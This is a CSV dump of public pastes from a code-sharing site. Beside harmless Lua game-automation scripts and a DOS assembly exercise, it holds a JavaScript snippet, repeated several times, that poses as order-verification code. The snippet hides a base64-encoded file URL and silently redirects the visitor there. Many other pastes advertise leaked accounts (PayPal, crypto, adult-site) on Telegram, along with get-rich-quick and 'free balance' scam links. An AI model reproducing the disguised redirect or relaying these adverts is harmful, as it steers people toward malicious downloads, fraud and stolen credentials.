id,title,username,language,date,content
PqcKw2ts,Untitled,SpawnKz,JavaScript,Friday 2nd of May 2025 06:43:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42695/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ryAiCz6z,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:43:40 AM CDT,72211 Accounts Posted On https://t.me/leakzbyeminem
vSqRknrP,Stake Free Balance Method,WantingTrae,JavaScript,Friday 2nd of May 2025 06:40:31 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 64447
1G09RNik,Make $1000 15-MINUTES  (BEGINNER) YR,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:39:14 AM CDT," 
Pdf https://tinyurl.com/freshleaks

gdJtCCse8T
"
5EdRNnKb,EARN $900 INSTANTLY 2025 95,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:30:00 AM CDT," 
Pdf https://tinyurl.com/freshleaks

6cTMkdbZ3x
"
8bqi3Mkp,Market.js,WantingTrae,JavaScript,Friday 2nd of May 2025 06:28:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55932/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jUeJCzKy,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:28:17 AM CDT,43026 Accounts Posted On https://t.me/leakzbyeminem
b6TJ2EHz,Make $1000 15-MINUTES (BEGINNER) L4,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:20:45 AM CDT," 
Pdf https://tinyurl.com/freshleaks

0UG5aRMv6X
"
rncwTbUx,Settings Manager,Blackhome,Lua,Friday 2nd of May 2025 06:13:07 AM CDT,"-- Settings Writer for Storage System
-- Platziert über dem Disk Drive mit der ""Settings""-Disk

local SETTINGS_LABEL = ""Settings""
local COORD_FILE = ""initial_coords.txt""
local TASK_FILE = ""task.txt""

-- Funktion: Hole Disk-Laufwerk mit Label ""Settings""
function getSettingsDisk()
    for _, side in ipairs(peripheral.getNames()) do
        if peripheral.getType(side) == ""drive"" then
            local disk = peripheral.wrap(side)
            if disk.getDiskLabel() == SETTINGS_LABEL then
                return disk, disk.getMountPath()
            end
        end
    end
    return nil, nil
end

-- Funktion: Überprüft, ob initial_coords.txt bereits existiert
function coordsFileExists()
    local _, path = getSettingsDisk()
    if not path then return false end
    return fs.exists(fs.combine(path, COORD_FILE))
end

-- Funktion: Fragt den Nutzer nach einer Koordinate (in Form ""x y z"")
function askForCoords(promptText)
    while true do
        print(promptText)
        local input = read()
        local x, y, z = input:match(""(-?%d+)%s+(-?%d+)%s+(-?%d+)"")
        if x and y and z then
            return tonumber(x), tonumber(y), tonumber(z)
        else
            print(""Ungültiges Format. Bitte erneut eingeben als: x y z"")
        end
    end
end

-- Funktion: Speichert die beiden Koordinaten in initial_coords.txt
function saveInitialCoords(x1, y1, z1, x2, y2, z2)
    local _, path = getSettingsDisk()
    if not path then error(""Settings-Disk nicht gefunden!"") end

    local fullPath = fs.combine(path, COORD_FILE)
    local file = fs.open(fullPath, ""w"")
    file.writeLine(string.format(""%d,%d,%d"", x1, y1, z1))
    file.writeLine(string.format(""%d,%d,%d"", x2, y2, z2))
    file.close()
    print(""Koordinaten erfolgreich gespeichert."")
end

-- Funktion: Erstellt task.txt auf Settings-Disk
function createTaskFile()
    local _, path = getSettingsDisk()
    if not path then error(""Settings-Disk nicht gefunden!"") end

    local taskPath = fs.combine(path, TASK_FILE)
    local file = fs.open(taskPath, ""w"")
    file.writeLine(""task=create_chests"")
    file.close()
    print(""task.txt erfolgreich erstellt (create_chests)."")
end

-- === Hauptprogramm ===
print(""Starte Settings-Setup..."")

local _, path = getSettingsDisk()
while not path do
    print(""Warte auf eingelegte Settings-Disk..."")
    sleep(1)
    _, path = getSettingsDisk()
end

if coordsFileExists() then
    print(""initial_coords.txt existiert bereits. Keine Aktion erforderlich."")
else
    print(""Keine initial_coords.txt gefunden. Bitte Koordinaten eingeben."")
    local x1, y1, z1 = askForCoords(""Start-Koordinate eingeben (x y z):"")
    local x2, y2, z2 = askForCoords(""End-Koordinate eingeben (x y z):"")
        -- === Nutzerabfrage zur Kistenerstellung ===
        print()
        print(""Sollen die Kisten jetzt manuell erstellt werden oder per Task?"")
        print(""[1] Kisten existieren bereits"")
        print(""[2] Kisten sollen per Task erstellt werden"")
        write(""Auswahl (1 oder 2): "")
        local choice = read()
    
        if choice == ""2"" then
            createTaskFile()
        else
            print(""Kein Task erstellt. Es wird davon ausgegangen, dass die Kisten vorhanden sind."")
        end
    saveInitialCoords(x1, y1, z1, x2, y2, z2)
end
"
kd7ngRCH,Untitled,WantingTrae,JavaScript,Friday 2nd of May 2025 06:13:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92323/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ng8HPdRi,Crypto Accounts,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:12:54 AM CDT,77169 Accounts Posted On https://t.me/leakzbyeminem
JxLp3WAi,EARN $900 INSTANTLY 2025⭐ GV,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:11:32 AM CDT," 
Pdf https://tinyurl.com/freshleaks

veHCmdtjik
"
wzkhqCJx,dataNone,TestGuy1,JSON,Friday 2nd of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9b7bca3043b47d3c6476c0b88c06b771b10dde59b89b8cba04e4e875107afeb1d5dcb4b33e7b49d3e5001c62e9be455a3a65f38c2273e5e4f4857738af84ce22e0ccbfafdffb86eb8cd1d924c45c975ead17054e15eddfc0196cc4743c177fb5987ee796d0b8222eec55598eac86cbafb8feb8c685947ae3e1d9b6843482d226',
  otherdata: [
    '8aa3308a2f032fee732e1beeabddfd15',
    'de4a852f3442f5388a5a3593dd39388a',
    '254ff24c29771c22353d7ac449a28385',
    '198a48a1e94ee7b761155acb1a61dfbb',
    'af149a5a9ffbfa7d53791bac1f798e58',
    'cc7756c08b7fda542fe6d6b86d47af41',
    '8c0eae30226d6ba67bd333795ee71a7e',
    '846508e89cf7d317f8b50f4976f01574'
  ]
}"
Trxz244q,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:57:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g9DR2nt2,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:57:31 AM CDT,71884 Accounts Posted On https://t.me/leakzbyeminem
9xVicwSr,Untitled,Artychenal,6502 TASM/64TASS,Friday 2nd of May 2025 05:53:30 AM CDT,"DATA SEGMENT
    msg_input       DB ""Enter value (from -32768 to 65488): $""    ; Повідомлення для введення числа
    input_buffer    DB 7,?, 7 DUP ("" "")                           ; Буфер для введення даних
    msg_output      DB ""Result (input value + 47): $""             ; Повідомлення для виводу результату
    newline         DB 0Dh,0Ah,""$""                                ; Символ нового рядка
    msg_error       DB ""Invalid input!$""                          ; Повідомлення про помилку
    msg_range_error DB ""Value is out of range!$""                  ; Повідомлення про вихід за межі
    number          DW ?                                          ; Змінна для збереження числа
    is_negative     DB 0                                          ; Флаг знаку (0 - додатне, 1 - від'ємне)
DATA ENDS

STACK_SEG SEGMENT PARA STACK ""STACK""
              DB 64 DUP(""STACK"")
STACK_SEG ENDS

CODE SEGMENT
                          ASSUME CS:CODE, DS:DATA, SS:STACK_SEG

    START:                
                          MOV    AX, DATA
                          MOV    DS, AX

                          CALL   PRINT_PROMPT                      ; Вивід повідомлення для введення
                          CALL   VALIDATE_INPUT                    ; Перевірка коректності введеного числа

                          MOV    SI, OFFSET input_buffer + 2
                          XOR    BX, BX                            ; Обнуляємо BX для збереження числа
                          XOR    DX, DX                            ; Обнуляємо DX
                          CLD                                      ; Скидаємо прапор напрямку
                          MOV    is_negative, 0                    ; Ініціалізуємо флаг знаку

                          MOV    AL, [SI]
                          CMP    AL, '-'
                          JNE    CONVERT_TO_NUMBER
                          MOV    is_negative, 1                    ; Позначаємо число як від'ємне
                          INC    SI                                ; Пропускаємо знак мінус

    CONVERT_TO_NUMBER:    
                          MOV    AL, [SI]
                          CMP    AL, '0'
                          JB     END_CONVERSION                    ; Якщо символ менший за '0', вихід
                          CMP    AL, '9'
                          JA     END_CONVERSION                    ; Якщо символ більший за '9', вихід

                          SUB    AL, '0'                           ; Перетворення ASCII в число
                          MOV    AH, 0

                          PUSH   AX
                          MOV    AX, BX
                          MOV    CX, 10
                          MUL    CX
                          CMP    DX, 0
                          JNE    OVERFLOW_ERROR                    ; Перевірка переповнення
                          MOV    BX, AX
                          POP    AX                                ; Відновлюємо цифру
                          ADD    BX, AX

                          INC    SI
                          JMP    CONVERT_TO_NUMBER

    OVERFLOW_ERROR:       
                          CALL   PRINT_NEWLINE
                          MOV    DX, OFFSET msg_range_error
                          MOV    AH, 9
                          INT    21h
                          JMP    START

    END_CONVERSION:       
                          MOV    number, BX
                          CMP    is_negative, 1
                          JNE    ADD_OFFSET
                          CALL   CHECK_RANGE
                          NEG    number                            ; Робимо число від'ємним

    ADD_OFFSET:           
                          ADD    number, 47                        ; Додаємо зміщення
                          JC     OVERFLOW_ERROR
                          CMP    number, -1
                          JLE    PRINT_RESULT
                          CALL   RESET_SIGN_FLAG

    PRINT_RESULT:         
                          CALL   PRINT_NEWLINE
                          MOV    DX, OFFSET msg_output
                          MOV    AH, 9
                          INT    21h

                          CMP    is_negative, 0
                          JNE    PRINT_NEGATIVE
                          CMP    number, 0
                          JAE    PRINT_NUMBER

    PRINT_NEGATIVE:       
                          MOV    DL, '-'
                          MOV    AH, 2
                          INT    21h
                          NEG    number

    PRINT_NUMBER:         
                          MOV    AX, number
                          CALL   DISPLAY_NUMBER

                          MOV    AH, 4Ch
                          INT    21h

RESET_SIGN_FLAG PROC
                          MOV    is_negative, 0
                          RET
RESET_SIGN_FLAG ENDP

DISPLAY_NUMBER PROC
                          PUSH   number
                          PUSH   CX
                          PUSH   DX
                          XOR    CX, CX
                          MOV    number, 10

    TO_STRING:            
                          XOR    DX, DX
                          DIV    number
                          ADD    DL, '0'
                          PUSH   DX
                          INC    CX
                          TEST   AX, AX
                          JNZ    TO_STRING

    PRINT_DIGITS:         
                          POP    DX
                          MOV    AH, 2
                          INT    21h
                          LOOP   PRINT_DIGITS

                          POP    DX
                          POP    CX
                          POP    number
                          RET
DISPLAY_NUMBER ENDP

VALIDATE_INPUT PROC
                          MOV    SI, OFFSET input_buffer + 2
                          MOV    CL, [input_buffer + 1]
                          MOV    BL, 0
                          MOV    AL, [SI]
                          CMP    AL, '-'
                          JNE    CHECK_NUMBERS
                          INC    SI
                          DEC    CX
                          JZ     INPUT_ERROR

    CHECK_NUMBERS:        
                          MOV    AL, [SI]
                          CMP    CX, 0
                          JZ     END_VALIDATION

    CHECK_LOOP:           
                          MOV    AL, [SI]
                          CMP    AL, '0'
                          JB     INPUT_ERROR
                          CMP    AL, '9'
                          JA     INPUT_ERROR

                          INC    BL
                          INC    SI
                          DEC    CX
                          JNZ    CHECK_LOOP

                          CMP    BL, 0
                          JZ     INPUT_ERROR
                          JMP    END_VALIDATION

    INPUT_ERROR:          
                          MOV    DX, OFFSET msg_error
                          MOV    AH, 9
                          INT    21h
                          JMP    ERROR_EXIT

    ERROR_EXIT:           
                          JMP    START

    END_VALIDATION:       
                          RET
VALIDATE_INPUT ENDP

CHECK_RANGE PROC
                          MOV    AX, number
                          CMP    is_negative, 0
                          JB     CHECK_POSITIVE_LIMITS
                          CMP    AX, -32768
                          JA     RANGE_ERROR
                          CMP    AX, 32721
                          JG     RANGE_ERROR
                          RET

    CHECK_POSITIVE_LIMITS:
                          CMP    AX, 0
                          JL     RANGE_ERROR
                          CMP    AX, 65488
                          JA     RANGE_ERROR
                          RET

    RANGE_ERROR:          
                          CALL   PRINT_NEWLINE
                          MOV    DX, OFFSET msg_range_error
                          MOV    AH, 9
                          INT    21h
                          JMP    START
CHECK_RANGE ENDP

PRINT_PROMPT PROC
                          MOV    DX, OFFSET msg_input
                          MOV    AH, 9
                          INT    21h

                          MOV    DX, OFFSET input_buffer
                          MOV    AH, 10
                          INT    21h
                          RET
PRINT_PROMPT ENDP

PRINT_NEWLINE PROC
                          MOV    DX, OFFSET newline
                          MOV    AH, 9
                          INT    21h
                          RET
PRINT_NEWLINE ENDP

CODE ENDS
END START"
wngmYPW6,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:42:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07314/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gq5PHW48,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:42:09 AM CDT,35672 Accounts Posted On https://t.me/leakzbyeminem
wngsBEP2,Main Storage Management,Blackhome,Lua,Friday 2nd of May 2025 05:41:11 AM CDT,"-- Storage System Manager
-- By ChatGPT, structured for modular expansion

-- === CONFIG ===
local DISK_NAMES = {
    incoming = ""Incoming Task"",
    user = ""User Task"",
    outgoing = ""Outgoing Task"",
    finished = ""Finished Task"",
    settings = ""Settings"",
    storage = ""Data Storage"",
    init = ""Turtle Initializing""
}

local TASK_DATA = {
    currentTasks = {},
    emptyChests = {},
    storedItems = {},
    completedTasks = {},
    totalChestCount = 0,
    outgoingTask = nil
}

local SYSTEM_STATE = {
    chestInitialized = false,
    waitingForChestPlacement = false,
    orientation = nil,
    orientationDirection = 1,
    startCoords = nil,
    endCoords = nil,
    modulo = nil
}

local taskIdCounter = 1
local currentTaskSourceIndex = 1
local TASK_SOURCES = {""incoming"", ""user"", ""settings""}  -- disk name keys

-- === UTILITIES ===
function getDiskByLabel(label)
    for _, side in ipairs(peripheral.getNames()) do
        if peripheral.getType(side) == ""drive"" then
            local disk = peripheral.wrap(side)
            if disk.getDiskLabel() == label then
                return disk, disk.getMountPath()
            end
        end
    end
    return nil, nil
end

function saveTableToDisk(tableData, filename)
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then error(""Data Storage disk not found"") end
    local fullPath = fs.combine(path, filename)
    local file = fs.open(fullPath, ""w"")
    file.write(textutils.serialize(tableData))
    file.close()
end

function loadTableFromDisk(filename)
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then return {} end
    local fullPath = fs.combine(path, filename)
    if not fs.exists(fullPath) then return {} end
    local file = fs.open(fullPath, ""r"")
    local data = textutils.unserialize(file.readAll())
    file.close()
    return data or {}
end

function loadTaskIdCounter()
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then return 1 end
    local fullPath = fs.combine(path, ""taskIdCounter.txt"")
    if fs.exists(fullPath) then
        local file = fs.open(fullPath, ""r"")
        local id = tonumber(file.readLine())
        file.close()
        return id or 1
    end
    return 1
end

function saveTaskIdCounter()
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then error(""Data Storage disk not found for saving taskIdCounter"") end
    local fullPath = fs.combine(path, ""taskIdCounter.txt"")
    local file = fs.open(fullPath, ""w"")
    file.writeLine(tostring(taskIdCounter))
    file.close()
end


function saveTaskToDisk(taskType, contentTable)
    local disk, path = getDiskByLabel(DISK_NAMES.outgoing)
    if not path then error(""Outgoing Task disk not found"") end

    local tasksPath = fs.combine(path, ""tasks"")
    if not fs.exists(tasksPath) then fs.makeDir(tasksPath) end

    local filename = taskType .. ""_"" .. tostring(taskIdCounter)
    local fullPath = fs.combine(tasksPath, filename .. "".txt"")
    local file = fs.open(fullPath, ""w"")
    for k, v in pairs(contentTable) do
        file.writeLine(k .. ""="" .. tostring(v))
    end
    file.writeLine(""taskType="" .. taskType)
    file.writeLine(""taskId="" .. tostring(taskIdCounter))
    file.close()

    contentTable.taskId = taskIdCounter
    contentTable.taskType = taskType
    table.insert(TASK_DATA.currentTasks, contentTable)
    saveTableToDisk(TASK_DATA.currentTasks, ""currentTasks.txt"")
    taskIdCounter = taskIdCounter + 1
    saveTaskIdCounter()
end



-- === INITIALIZATION ===
function waitForInitialSettings()
    print(""Waiting for settings..."")
    local _, path = getDiskByLabel(DISK_NAMES.settings)
    while not path do sleep(1) path = select(2, getDiskByLabel(DISK_NAMES.settings)) end

    local settingsPath = fs.combine(path, ""initial_coords.txt"")
    while not fs.exists(settingsPath) do sleep(1) end

    local file = fs.open(settingsPath, ""r"")
    local x1, y1, z1 = file.readLine():match(""(-?%d+),(-?%d+),(-?%d+)"")
    local x2, y2, z2 = file.readLine():match(""(-?%d+),(-?%d+),(-?%d+)"")
    file.close()

    SYSTEM_STATE.startCoords = {x=tonumber(x1), y=tonumber(y1), z=tonumber(z1)}
    SYSTEM_STATE.endCoords = {x=tonumber(x2), y=tonumber(y2), z=tonumber(z2)}

    determineOrientation(SYSTEM_STATE.startCoords, SYSTEM_STATE.endCoords)
end

function determineOrientation(startPos, endPos)
    if startPos.x ~= endPos.x then
        SYSTEM_STATE.orientation = ""x""
        SYSTEM_STATE.orientationDirection = (endPos.x - startPos.x > 0) and 1 or -1
        SYSTEM_STATE.modulo = (startPos.z + 2 * SYSTEM_STATE.orientationDirection) % 8
    elseif startPos.z ~= endPos.z then
        SYSTEM_STATE.orientation = ""z""
        SYSTEM_STATE.orientationDirection = (endPos.z - startPos.z > 0) and 1 or -1
        SYSTEM_STATE.modulo = (startPos.x + 2 * SYSTEM_STATE.orientationDirection) % 8
    else
        SYSTEM_STATE.orientation = ""unknown""
        SYSTEM_STATE.orientationDirection = 1
        SYSTEM_STATE.modulo = 0
    end

    local disk, path = getDiskByLabel(DISK_NAMES.init)
    if path then
        local file = fs.open(fs.combine(path, ""init.txt""), ""w"")
        file.writeLine(""orientation="" .. SYSTEM_STATE.orientation)
        file.writeLine(""direction="" .. tostring(SYSTEM_STATE.orientationDirection))
        file.writeLine(""modulo="" .. tostring(SYSTEM_STATE.modulo))
        file.close()
    end
end

function createChestInitializationTask(coords)
    if #TASK_DATA.emptyChests == 0 then
        SYSTEM_STATE.waitingForChestPlacement = true
    end
    local taskContent = {task=""create_chests"", x=coords.x, y=coords.y, z=coords.z}
    saveTaskToDisk(""create_chests"", taskContent)
end

function initializeChestList(coords)
    print(""Initializing chest list..."")
    for row = 0, 4 do
        for col = 0, 9 do
            local offsetX = SYSTEM_STATE.orientation == ""x"" and col * SYSTEM_STATE.orientationDirection or 0
            local offsetZ = SYSTEM_STATE.orientation == ""z"" and col * SYSTEM_STATE.orientationDirection or 0
            local chestPos = {
                x = coords.x + offsetX,
                y = coords.y + row,
                z = coords.z + offsetZ
            }
            TASK_DATA.totalChestCount = TASK_DATA.totalChestCount + 1
            table.insert(TASK_DATA.emptyChests, {id = TASK_DATA.totalChestCount, pos = chestPos})
        end
    end
    SYSTEM_STATE.chestInitialized = true
    SYSTEM_STATE.waitingForChestPlacement = false
    saveTableToDisk(TASK_DATA.emptyChests, ""emptyChests.txt"")
    saveTableToDisk({count = TASK_DATA.totalChestCount}, ""totalChestCount.txt"")
end

function checkForCompletedTasks()
    local _, path = getDiskByLabel(DISK_NAMES.finished)
    if not path then return end
    local finishedPath = fs.combine(path, ""tasks"")
    if not fs.exists(finishedPath) then return end

    for _, file in ipairs(fs.list(finishedPath)) do
        local taskType, taskIdStr = file:match(""^(create_chests)_(%d+)%.txt$"")
        local taskId = tonumber(taskIdStr)

        if taskType and taskId then
            fs.delete(fs.combine(finishedPath, file))

            local matchedTask = nil
            local matchedIndex = nil
            for i, task in ipairs(TASK_DATA.currentTasks) do
                if task.taskType == taskType and task.taskId == taskId then
                    matchedTask = task
                    matchedIndex = i
                    break
                end
            end

            if matchedTask then
                initializeChestList({x=tonumber(matchedTask.x), y=tonumber(matchedTask.y), z=tonumber(matchedTask.z)})
                table.insert(TASK_DATA.completedTasks, matchedTask)
                table.remove(TASK_DATA.currentTasks, matchedIndex)
                saveTableToDisk(TASK_DATA.currentTasks, ""currentTasks.txt"")
                saveTableToDisk(TASK_DATA.completedTasks, ""completedTasks.txt"")
            end
        end
    end
end


function handleIncomingTask() end
function handleUserTask() end
function handleSettingsTask() end
function handleChestCreationTask() end

local handlerMap = {
    incoming = handleIncomingTask,
    user = handleUserTask,
    settings = handleSettingsTask
}

-- === START ===
TASK_DATA.currentTasks = loadTableFromDisk(""currentTasks.txt"")
TASK_DATA.emptyChests = loadTableFromDisk(""emptyChests.txt"")
TASK_DATA.storedItems = loadTableFromDisk(""storedItems.txt"")
TASK_DATA.completedTasks = loadTableFromDisk(""completedTasks.txt"")
local chestCountData = loadTableFromDisk(""totalChestCount.txt"")
TASK_DATA.totalChestCount = chestCountData.count or 0
taskIdCounter = loadTaskIdCounter()

if #TASK_DATA.emptyChests == 0 and not SYSTEM_STATE.chestInitialized then
    waitForInitialSettings()
    local _, settingsPath = getDiskByLabel(DISK_NAMES.settings)
    local settingsTaskFile = fs.combine(settingsPath, ""task.txt"")
    if fs.exists(settingsTaskFile) then
        createChestInitializationTask(SYSTEM_STATE.startCoords)
    else
        initializeChestList(SYSTEM_STATE.startCoords)
    end
end

-- === MAIN LOOP ===
while true do
    checkForCompletedTasks()

    if SYSTEM_STATE.waitingForChestPlacement then
        -- actively check settings disk for new create_chests task
        handlerMap.settings()
    elseif #TASK_DATA.emptyChests == 0 then
        SYSTEM_STATE.waitingForChestPlacement = true
    else
        local sourceKey = TASK_SOURCES[currentTaskSourceIndex]
        handlerMap[sourceKey]()

        currentTaskSourceIndex = currentTaskSourceIndex + 1
        if currentTaskSourceIndex > #TASK_SOURCES then
            currentTaskSourceIndex = 1
        end
    end

    sleep(1)
end
"
